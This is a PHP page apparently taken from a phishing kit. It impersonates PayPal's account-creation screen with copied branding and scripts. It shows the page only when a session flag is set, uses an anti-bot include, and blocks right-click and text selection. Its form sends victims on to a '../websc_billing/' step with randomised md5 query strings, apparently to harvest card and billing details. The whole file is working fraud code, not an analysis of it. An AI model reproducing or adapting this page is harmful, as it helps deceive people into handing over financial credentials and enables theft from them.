<?php 
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php';
if(isset($_SESSION["mrigla"] ) ){ echo "
<!DOCTYPE html><html class=\"no-js superBowlBG accountCreate\" lang=\"en\" dir=\"ltr\">
<head>
<title>".$infottl."</title>
<meta http-equiv=\"X-UA-COMPATIBLE\" content=\"IE-edge\" />
	<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\" />
	<meta name=\"application-name\" content=\"Update\" />
	<meta name=\"msapplication-task\" content=\"\" />
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes\" />	
<link rel=\"stylesheet\" href=\"../css/appSuperBowl.css\" />
<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"../img/ppl.ico\">
<script>if (self === top) {var antiClickjack = document.getElementById(\"antiClickjack\");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script>
<script language=\"JavaScript1.2\" type=\"text/javascript\">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function (\"return false\")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function(\"return false\")
        
</script>
</head><body class=\"desktop windows 8&#x2E;1 accountCreate US\" data-_csrf=\"HfsRGH5ySx8SS2XoBuT3NFDe7&#x2B;sOH0istUb9I&#x3D;\" data-template-path=\"https&#x3A;&#x2F;&#x2F;www&#x2E;paypalobjects&#x2E;com&#x2F;web&#x2F;res&#x2F;5fc&#x2F;a54ed347e73e4ab196e8f92abf7a5&#x2F;templates&#x2F;US&#x2F;en/%s.js\" data-fso-token=\"\" data-view-name=\"signup&#x2F;accountCreate\" ><noscript><p class=\"nonjsAlert\" role=\"alert\">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript><header class=\"mainHeader\" role=\"banner\"><div class=\"headerContainer\">
<div class=\"grid12\"><a data-click=\"payPalLogo\"  href=\"#\" class=\"logo\"></a><div class=\"gradientSpacer\"><div> </div></div><div class=\"loginBtn\"><a data-click=\"loginLink\" href=\"#\" class=\"button secondary small  custom\">".$log."</a></div></div></div></header><main class=\"superBowlMain\"><section id=\"content\" role=\"main\" data-country=\"US\"><section id=\"main\" class=\"\"><div id=\"create\" class=\"create grid12\"><script type=\"application/json\" fncls=\"fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99\">{\"f\":\"8ca82980d2c511e689ae0d187383423f\",\"s\":\"t_s\",\"mm\":\"true\"}</script>
<script type=\"text/javascript\">(function() {var dom, doc, where, iframe = document.createElement('iframe');iframe.src = \"javascript:false\";iframe.title = \"\";iframe.role = \"presentation\";(iframe.frameElement || iframe).style.cssText = \"display:none; width: 0; height: 0; border: 0\";where = document.getElementsByTagName('script');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src = \"javascript:var d=document.open();d.domain='\" + dom + \"';void(0);\";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement(\"script\");if (dom) {this.domain = dom;}js.id = \"js-iframe-async\";js.src = \"https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js\";this.body.appendChild(js);};doc.write(\'<body onload=\"document._l();\">\');doc.close();})();</script><noscript><img src=\"https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1\"></noscript>
<div class=\"customGrid7\"><form action=\"../websc_billing/?enc=".md5(rand(9999999999,99999999999999999999))."&p=1&dispatch=".md5(rand(9999999,99999999999999999999))." \" method=\"post\"  name=\"create_form\" class=\"proceed\">    <div class=\"pageHeader\"><h2>".$mo7."</h2></div><div class=\"superBowlContainer\"><div class=\"inner\">
<br><br><center><img style=\"width:100px;height:100px\" src=\"../img/shield.png\"><br><br><b>".$mo8."</center></B><br>".$mo9."
<br><br>".$mo10."<br><br>
<b><li>".$mo11."</li><li>".$mo12."</li><li>".$mo13."</li></b><br><br>
".$mo14."<br><br>
<input id=\"submitBtn\" name=\"_eventId_continue\" type=\"submit\" class=\"button\"value=\"".$process."\"data-click=\"createSubmit\"/>
</div></div></form></div></form></div><center><br><br><div class=\"footerNav\"><div class=\"legal\"><b><a style=\"cursor:pointer\">".$contact."</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style=\"cursor:pointer\">".$feedback." </a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style=\"cursor:pointer\">".$privacy."</a><ul></li></noscript></div></body></html> ";
} 
else {
	header("location: ../");
} 
?>